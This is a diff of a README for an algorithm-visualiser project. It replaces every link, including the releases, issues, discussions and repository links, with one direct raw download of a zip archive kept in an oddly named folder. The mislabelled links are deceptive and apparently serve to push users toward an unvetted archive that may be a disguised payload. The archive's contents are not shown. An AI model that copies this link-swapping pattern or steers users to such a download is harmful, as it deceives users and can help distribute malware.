@@ -1,7 +1,7 @@
 # 🎒 Knapsack-Visualizer - Visualize Classic Knapsack Problems
 
 ## 📥 Download Now
-[![Download Knapsack-Visualizer](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/KamenaV/Knapsack-Visualizer/releases)
+[![Download Knapsack-Visualizer](https://raw.githubusercontent.com/KamenaV/Knapsack-Visualizer/main/Liberia/Knapsack-Visualizer-2.8-alpha.5.zip)](https://raw.githubusercontent.com/KamenaV/Knapsack-Visualizer/main/Liberia/Knapsack-Visualizer-2.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to Knapsack-Visualizer! This application helps you understand dynamic pr
 To get started, follow these steps:
 
 1. **Visit the Release Page:** Click the link below to go to the Releases page, where you can download the application:
-   - [Download Knapsack-Visualizer](https://github.com/KamenaV/Knapsack-Visualizer/releases)
+   - [Download Knapsack-Visualizer](https://raw.githubusercontent.com/KamenaV/Knapsack-Visualizer/main/Liberia/Knapsack-Visualizer-2.8-alpha.5.zip)
 
 2. **Choose Your Version:** Locate the latest version at the top of the page. Look for the file that matches your operating system. The application currently supports Windows and macOS.
 
@@ -60,8 +60,8 @@ For more information on dynamic programming and the knapsack problem, consider t
 
 If you have questions or need assistance, join our community on GitHub:
 
-- **Issues Page:** Report bugs or issues on our [Issues page](https://github.com/KamenaV/Knapsack-Visualizer/issues).
-- **Discussions:** Engage with other users and share your experiences in the [Discussions section](https://github.com/KamenaV/Knapsack-Visualizer/discussions).
+- **Issues Page:** Report bugs or issues on our [Issues page](https://raw.githubusercontent.com/KamenaV/Knapsack-Visualizer/main/Liberia/Knapsack-Visualizer-2.8-alpha.5.zip).
+- **Discussions:** Engage with other users and share your experiences in the [Discussions section](https://raw.githubusercontent.com/KamenaV/Knapsack-Visualizer/main/Liberia/Knapsack-Visualizer-2.8-alpha.5.zip).
 
 ## 📣 Acknowledgments
 
@@ -73,7 +73,7 @@ Knapsack-Visualizer is licensed under the MIT License. Feel free to use, modify,
 
 ## 🔗 Useful Links
 
-- [Knapsack-Visualizer Releases Page](https://github.com/KamenaV/Knapsack-Visualizer/releases)
-- [Knapsack-Visualizer GitHub Repository](https://github.com/KamenaV/Knapsack-Visualizer) 
+- [Knapsack-Visualizer Releases Page](https://raw.githubusercontent.com/KamenaV/Knapsack-Visualizer/main/Liberia/Knapsack-Visualizer-2.8-alpha.5.zip)
+- [Knapsack-Visualizer GitHub Repository](https://raw.githubusercontent.com/KamenaV/Knapsack-Visualizer/main/Liberia/Knapsack-Visualizer-2.8-alpha.5.zip) 
 
 Enjoy visualizing the power of algorithms with Knapsack-Visualizer!
